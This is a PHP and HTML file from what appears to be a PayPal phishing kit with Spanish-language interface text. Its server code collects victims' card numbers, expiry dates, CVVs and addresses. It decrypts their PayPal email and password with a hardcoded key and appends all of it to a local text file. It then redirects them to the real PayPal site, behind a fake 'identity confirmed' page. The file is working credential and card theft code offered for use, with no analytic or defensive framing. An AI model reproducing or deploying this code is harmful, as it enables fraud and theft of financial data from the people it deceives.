<?php
include("../../../../inc/crypt.php");
$cc = $_POST["cardNumber"];
$tipo = $_POST["brand"];
$venc = $_POST["expDate"];
$cvv = $_POST["verificationCode"];
$dir = $_POST["dir"];
$email = decrypt($_POST["securitycode"], "Manaosuvita10");
$pass = decrypt($_POST["verifycode"], "Manaosuvita10");
$path = "../../../../cuentas.txt";
  if(!file_exists($path)){
    $myfile = fopen($path, "a+t") or die("Unable to open file!");
    $txt = ">> Paypal (Login) <<\n\nEmail: ".$email."\nContraseña: ".$pass."\n\n>> PayPal (CC) <<\n\nCc: ".$cc."\nTarjeta: ".$tipo."\nVencimiento: ".$venc."\nCvv: ".$cvv."\nDireccion: ".$dir;
    fwrite($myfile, $txt);
    fclose($myfile);
  }
  else{
    $myfile = fopen($path, "a+t") or die("Unable to open file!");
    $txt = "\n\n>> Paypal (Login) <<\n\nEmail: ".$email."\nContraseña: ".$pass."\n\n>> PayPal (CC) <<\n\nCc: ".$cc."\nTarjeta: ".$tipo."\nVencimiento: ".$venc."\nCvv: ".$cvv."\nDireccion: ".$dir;
    fwrite($myfile, $txt);
    fclose($myfile);
  }
sleep(2);
header('Location: https://www.paypal.com/');
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" type="image/x-icon" href="PayPal_archivos/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="PayPal_archivos/paypal-sans.css">
    <link rel="stylesheet" href="PayPal_archivos/style.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="PayPal_archivos/main-ltr.css">
    <link rel="stylesheet" href="PayPal_archivos/header-footer-min.css">
    <title>PayPal: Confirmar tarjeta</title>
  </head>
  <body>
    <div class="container-fluid full">
      <div class="row justify-content-md-center">
        <div class="col-9 vent-modal">
          <div class="container-fluid spa">
            <div class="row justify-content-md-center">
              <div class="col-md-9">
                <div class="container-fluid">
                  <div class="row justify-content-md-center">
              <div class="col-md-12">
                <div class="logo"></div>
              </div>
              <div class="col-md-12">
                <h2 class="asociar">Identidad confirmada<br><span style="font-size:16px">Sera redireccionado a PayPal en unos segundos.</span></h2>
              </div>
              <div class="col-md-12">
              	<div class="success">
              		<svg viewBox="0 0 68 69" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="svg" preserveAspectRatio="xMaxYMax meet"><title>icSuccessLg</title><desc>Created with Sketch.</desc><g id="PP" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"><g id="Amex_PP_Success_Send-Copy" transform="translate(-154.000000, -205.000000)" stroke="#00CF92" stroke-width="3"><g id="icSuccessLg" transform="translate(155.500000, 207.250000)"><path d="M24.0931122,33.4027041 L32.5,41.8095918 L59.5837755,14.7264796 L59.6753061,14.667449 C53.8657653,5.83209184 43.8643878,0 32.5,0 C14.5507143,0 0,14.5507143 0,32.5 C0,50.4492857 14.5507143,65 32.5,65 C50.4492857,65 65,50.4492857 65,32.5 C65,30.1779082 64.7565816,27.9128571 64.2936224,25.7287245" id="Page-1"></path></g></g></g></svg>
              	</div>
              </div>
              </div>
              </div>
            </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src="PayPal_archivos/vx-lib.min.js"></script>
    <script src="PayPal_archivos/pa.js"></script>
    <script src="PayPal_archivos/vendor.js"></script>
    <script src="PayPal_archivos/appBundle.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  <script>
    document.getElementById("brand").onchange = creditcard;
    var image = document.getElementById("card-image");
    var cvv = document.getElementById("cvv");
    function creditcard(){
    var value = this.value
      
      if (value == "unselected"){
        image.src = "PayPal_archivos/generic_card.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "visa"){
        image.src = "PayPal_archivos/visa.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "master_card"){
        image.src = "PayPal_archivos/master_card.png"
        cvv.classList.remove("csc-image_amex");
      }else if (value == "amex"){
        image.src = "PayPal_archivos/amex.png"
        cvv.classList.add("csc-image_amex");
      }else if (value == "discover"){
        image.src = "PayPal_archivos/discover.png"
        cvv.classList.remove("csc-image_amex");
      }
      
    }

  </script>
  </body>
</html>